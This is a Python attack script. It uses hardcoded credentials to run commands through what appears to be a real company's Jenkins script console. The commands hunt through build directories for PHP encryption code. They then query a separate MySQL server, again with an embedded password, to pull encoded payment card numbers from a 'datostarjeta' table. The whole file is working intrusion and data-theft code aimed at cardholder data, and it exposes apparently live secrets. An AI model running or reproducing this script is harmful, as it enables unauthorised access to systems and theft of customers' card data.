"""
Find PHP encryption source code on Jenkins — targeted search in builds
"""
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, timeout=180):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(
        BASE + '/crumbIssuer/api/json',
        headers={'Authorization': 'Basic ' + AUTH}
    )
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={
            'Authorization': 'Basic ' + AUTH,
            crumb['crumbRequestField']: crumb['crumb']
        }
    )
    return opener.open(req2, timeout=timeout).read().decode()


# Step 1: Write a search script to Jenkins filesystem and execute it
# Avoids Groovy escaping by using a heredoc/file approach
print("=" * 70)
print("STEP 1: Explore cs_legacy_back selfservice build structure")
print("=" * 70)

script1 = '''
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', 'ls -la /var/jenkins_home/jobs/cs_legacy_back/jobs/cs_legacy_pipe_build_selfservice/builds/2540/ 2>/dev/null; echo "---"; ls -la /var/jenkins_home/jobs/cs_legacy_back/jobs/cs_legacy_pipe_build_selfservice/builds/2540/archive/ 2>/dev/null; echo "---"; find /var/jenkins_home/jobs/cs_legacy_back/jobs/ -name "workspace" -type d 2>/dev/null'].execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(15000)
println sout.toString()
'''

try:
    r = jenkins_exec(script1)
    print(r[:3000])
except Exception as e:
    print(f"Error: {e}")

# Step 2: Look for workspace directories (where source code lives)
print("\n" + "=" * 70)
print("STEP 2: Find workspace dirs in se_new_back and sn_legacy_back")
print("=" * 70)

script2 = '''
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', 'find /var/jenkins_home/jobs -maxdepth 5 -name "workspace" -type d 2>/dev/null'].execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(15000)
println sout.toString()
'''

try:
    r = jenkins_exec(script2)
    print(r[:3000])
except Exception as e:
    print(f"Error: {e}")

# Step 3: Look at se_new_back structure (newer Sears backend might have the code)
print("\n" + "=" * 70)
print("STEP 3: Explore se_new_back job structure")
print("=" * 70)

script3 = '''
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', 'find /var/jenkins_home/jobs/se_new_back -maxdepth 5 -type d 2>/dev/null | head -40'].execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(15000)
println sout.toString()
'''

try:
    r = jenkins_exec(script3)
    print(r[:3000])
except Exception as e:
    print(f"Error: {e}")

# Step 4: Search for PHP files specifically about encryption in recent builds  
print("\n" + "=" * 70)
print("STEP 4: Find PHP files in the most recent builds")
print("=" * 70)

script4 = '''
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', 'find /var/jenkins_home/jobs/cs_legacy_back/jobs/cs_legacy_pipe_build_selfservice/builds/2540 -name "*.php" 2>/dev/null | head -30; echo "==="; find /var/jenkins_home/jobs/se_legacy_back/jobs/se_legacy_pipe_build_axii-sears/builds/1333 -name "*.php" 2>/dev/null | head -30'].execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(30000)
println sout.toString()
'''

try:
    r = jenkins_exec(script4)
    print(r[:3000])
except Exception as e:
    print(f"Error: {e}")

# Step 5: Try to use MySQL directly to find stored functions/procedures
print("\n" + "=" * 70)
print("STEP 5: Check MySQL for encryption functions")  
print("=" * 70)

script5 = '''
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', 'mysql -h 187.191.91.37 -u adaxxidb -pJTQ6PrkecY3y1kVN -e "SHOW FUNCTION STATUS WHERE Db=\\'tienda\\';" tienda 2>/dev/null; echo "==="; mysql -h 187.191.91.37 -u adaxxidb -pJTQ6PrkecY3y1kVN -e "SHOW PROCEDURE STATUS WHERE Db=\\'tienda\\';" tienda 2>/dev/null | grep -i "encrypt\\|decrypt\\|tarjeta\\|card\\|seguridad"'].execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(30000)
println sout.toString()
if (serr.toString().trim()) println "ERR: " + serr.toString().take(500)
'''

try:
    r = jenkins_exec(script5)
    print(r[:3000])
except Exception as e:
    print(f"Error: {e}")

# Step 6: Look for build artifacts that contain encryption keywords
print("\n" + "=" * 70)
print("STEP 6: Search build configs for encryption references")
print("=" * 70)

script6 = '''
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', 'find /var/jenkins_home/jobs -name "config.xml" -exec grep -l "encrypt" {} + 2>/dev/null | head -10'].execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(30000)
println sout.toString()
'''

try:
    r = jenkins_exec(script6)
    print(r[:2000])
except Exception as e:
    print(f"Error: {e}")

# Step 7: Try to get raw sample data from MySQL and inspect
print("\n" + "=" * 70) 
print("STEP 7: Get more samples and table structure from MySQL")
print("=" * 70)

script7 = '''
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = ['bash', '-c', "mysql -h 187.191.91.37 -u adaxxidb -pJTQ6PrkecY3y1kVN -e \\"DESCRIBE datostarjeta; SELECT numero, LENGTH(numero) as len, HEX(FROM_BASE64(numero)) as hex_data FROM datostarjeta LIMIT 10;\\" tienda 2>/dev/null"].execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(30000)
println sout.toString()
if (serr.toString().trim()) println "ERR: " + serr.toString().take(500)
'''

try:
    r = jenkins_exec(script7)
    print(r[:5000])
except Exception as e:
    print(f"Error: {e}")
